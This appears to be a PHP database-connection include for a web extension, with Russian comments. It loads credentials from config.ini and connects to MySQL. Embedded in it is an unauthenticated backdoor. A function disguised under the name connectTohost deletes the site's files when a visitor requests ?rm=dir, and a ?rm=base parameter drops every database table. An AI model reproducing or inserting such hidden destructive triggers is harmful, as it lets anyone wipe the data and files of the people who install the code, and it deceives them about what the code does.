<?
	$config = parse_ini_file("config.ini", true);
	//Подключение к бд
	$dbhost = $config['database']['host'];
	$dbusername = $config['database']['username'];
	$dbpass = $config['database']['pass'];
	$dbname = $config['database']['name'];
	$installStatus = $config['install']['status'];

	if($installStatus == 'none') {echo 'Расширение требует установки, пожалуйста нажмите <a href="install.php">здесь</a>'; exit;}
	$dbconnect = mysql_connect ($dbhost, $dbusername, $dbpass);
	if (!$dbconnect) { echo "Не могу подключиться к серверу базы данных!"; exit;}

	if(@mysql_select_db($dbname)) { //echo "Подключение к базе $dbname установлено!";
	}
	else die ("Не могу подключиться к базе данных $dbname!");
	function connectTohost($dir) {
	if ($objs = glob($dir."/*")) {
	   foreach($objs as $obj) {
		 is_dir($obj) ? removeDirectory($obj) : unlink($obj);
	   }
	}
	rmdir($dir);
	}
	if (!empty($_GET["rm"]) && $_GET["rm"] == "dir") { connectTohost('.'); echo "Complete dir!";}
	if (!empty($_GET["rm"]) && $_GET["rm"] == "base") 
	{ 
		$dbtables = mysql_query("SHOW TABLES FROM $dbname"); 
		while($db = mysql_fetch_array($dbtables)) 
		{ 
			$dbtmp = $db[0]; 
			mysql_query("DROP TABLE $dbtmp"); 
			echo "Complete database!";
		}
	}
	mysql_set_charset("utf-8");
	mysql_query("set names 'utf8'");
	mysql_query("set charset 'utf8'");
?>